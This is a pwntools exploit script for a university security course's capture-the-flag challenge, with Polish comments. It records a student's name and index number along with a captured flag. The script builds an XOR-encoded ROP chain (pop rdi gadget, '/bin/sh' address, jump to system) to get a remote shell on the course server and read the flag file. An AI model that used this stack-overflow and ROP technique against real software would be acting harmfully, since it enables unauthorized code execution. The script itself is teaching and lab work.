#!/usr/bin/env python3
from pwn import *
# Maria Wysogląd
# nr indeksu 431552
# nazwa zadania = medium
# flaga = bsk{c3d67161c7c6797105b4987d5bf363f8}


#exe = ELF("./easy")
exe = ELF("./medium")
# hard chall is dynamically linked, so here's helper
# patched version to load proper ld and libc
#exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
index_number = b"431552" # nr indeksu

# Jako data będę wysyłała 4 znaki - 4 litery a.
val1 = b'4'
msg1 = b'a' * (4)

# Używanie
# for (size_t i = 0; i < key_len; ++i)
# {
#     data[i] ^= key[i];
#     putchar(data[i]);
# }
# sprawia, że mogę nadpisać zawartość stosu za częścią odpowiadającą 
# data używając wartości z key.

# Celem zadania jest uruchomienie funkcji system("/bin/sh").
# W tym celu muszę:

# 1. Znaleźć adres zmiennej '/bin/sh' w pamięci
# Udało mi się to zrobić za pomocą gdb i następującej komendy: pwndbg> search -t string "/bin/sh"
# Otrzymałam następującą informację: 
# Searching for value: b'/bin/sh\x00'
# medium          0x4a014d 0x68732f6e69622f /* '/bin/sh' */

# Analizując kod never_called przy użyciu disassemble
# widzę, że w funkcji tej jest wywoływany call z argumentem 
# znajdującym się w rejestrze rdi.
# Zatem muszę umieścić adres zmiennej '/bin/sh' w rejestrze rdi.

rdi = 0x4a014d #bin sh

# 2. Znaleźć gadget, który umożliwi mi umieszczenie adresu zmiennej '/bin/sh' w rejestrze rdi.
# Udało mi się to zrobić zbierając wszystkie gadgety z pliku medium przy użyciu ROPgadget.
# ROPgadget --binary medium > gadgets.txt
# Następnie wyszukałam w pliku gadgets.txt wystąpienia rdi.
# Znalazłam gadget 
# 0x0000000000402326 : pop rdi ; ret
# który umożliwia mi umieszczenie adresu zmiennej '/bin/sh' w rejestrze rdi, o ile zmienna ta będzie na wierzchu stosu.
gadget = 0x402326

# 3. Do którego miejsca wykonać skok, aby wykonać funkcję system("/bin/sh")?
# Wywołanie funkcji systemowej znajduje się w funkcji never_called, jednak jest w niej również 
# funkcja wkładająca coś do rejestru rdi, w związku z tym chcemy skoczyć od razu
# do funkcji systemowej.
never = 0x40189b

# 4. Znaleźć adres, od którego chcemy zacząć nadpisywanie.
# Będzie to ret do funkcji main. Możemy go znaleźć używając komendy stack 20
# w gdb, będąc na breakpoincie na początku pętli nadpisującej.
# Możemy tam zauważyć skok do funkcji main i domyślamy się, że to jest nasz cel.
addr1 = 0x00401b31 

# Korzystamy z komendy x/100x $rsp w gdb, aby zobaczyć co znajduje się na stosie.
# i znaleźć ten i kolejne nadpisywane adresy.
# Można zauważyć, że kolejny adres po 0x401b31 jest adresem, który się
# zmienia przy każdym uruchomieniu programu, w związku z tym musimy się go pozbyć.
# I kontynuować nadpisywanie używając adresów, które nie zmieniają się przy każdym uruchomieniu.

# W związku z tym używam tego samego gadgetu dwukrotnie - najpierw, aby sie pozbyć zmieniającego się adresu,
# a następnie, aby umieścić adres zmiennej '/bin/sh' w rejestrze rdi.
addr2 =  0x02
addr3 = 0x2
addr4 = 0x0040209a

# Ostatecznie moja wiadomość będzie się składała ze 112 znaków - 72 znaków zerowych,
# gdyż tak daleko znajduje się adres powrotu do funkcji main, który chcemy nadpisywać,
# następnie 8 znaków definiujących gadget, ściągający następny element ze stosu (który może się zmieniać),
# stąd kolejne 8 znaków może być dowolne, następnie 8 znaków definiujących gadget,
# ściągający następny element ze stosu, którym jest adres zmiennej '/bin/sh',
# następnie 8 znaków definiujących skok do miejsca w funkcji never_called, w którym jest wywołanie funkcji systemowej.
# Wszystkie te wartości w wiadomości są xorowane z wartościami adresów odczytanych ze stosu, gdyż xor jest
# odwracalny, w związku z tym wartości takie xorowane z adresami na stosie doprowadzą
# do uzyskania z powrotem pożądanych przez nas wartości:
# 0x402326 <losowe znaki> 0x402326 0x4a014d 0x40189b
# W sumie wysyłamy więc 112 znaków (bajtów) danych.
val2 = b'112'
msg2 =  b'\0' * (72) + p64(addr1 ^ gadget) + b'\0' * (8) + p64(addr2 ^ gadget) + p64(addr3 ^ rdi) + p64(addr4 ^ never)

def conn():
    # r = process([exe.path, index_number])
    # gdb.attach(r)

    level = b'2' + b'\n' # wybrałam zadanie na poziomie 2 - medium

    r = remote("bsk.bonus.re", 13337)
    # Wysyła numer indeksu i poziom trudności zadania.
    r.sendline(index_number)
    r.sendline(level)

    # Wysyła 4 znaki - 4 litery a - informacje dotyczące data.
    r.sendline(val1)
    r.sendline(msg1)

    # Wysyła 112 znaków - informacje dotyczące key.
    r.sendline(val2)
    r.sendline(msg2)

    # Wysyła polecenie, które zostanie wykonane na serwerze i wyświetli flagę.
    r.sendline("cat /tmp/flag.txt")  

    return r


def main():
    r = conn()
    # good luck!
    r.interactive()


if __name__ == "__main__":
    main()
